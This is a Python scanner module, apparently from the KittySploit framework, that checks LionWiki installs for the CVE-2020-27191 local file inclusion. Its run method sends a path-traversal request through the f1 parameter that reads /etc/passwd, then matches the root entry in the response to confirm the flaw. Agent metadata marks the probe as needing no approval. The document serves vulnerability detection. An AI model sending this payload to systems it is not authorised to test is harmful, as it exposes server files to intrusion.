#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""LionWiki before 3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'LionWiki <3.2.12 - Local File Inclusion Detection',
        'description': 'LionWiki before 3.2.12 allows an unauthenticated user to read files as the web server user via crafted strings in the index.php f1 variable, aka local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'lionwiki', 'lfi', 'oss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.junebug.site/blog/cve-2020-27191-lionwiki-3-2-11-lfi',
            'http://lionwiki.0o.cz/index.php?page=Main+page',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27191',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-27191',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="LionWiki <3.2.12 - Local File Inclusion detected",
                path='/index.php?page=&action=edit&f1=.//./\\.//./\\.//./\\.//./\\.//./\\.//./etc/passwd&restore=1',
            )
            return True
        return False

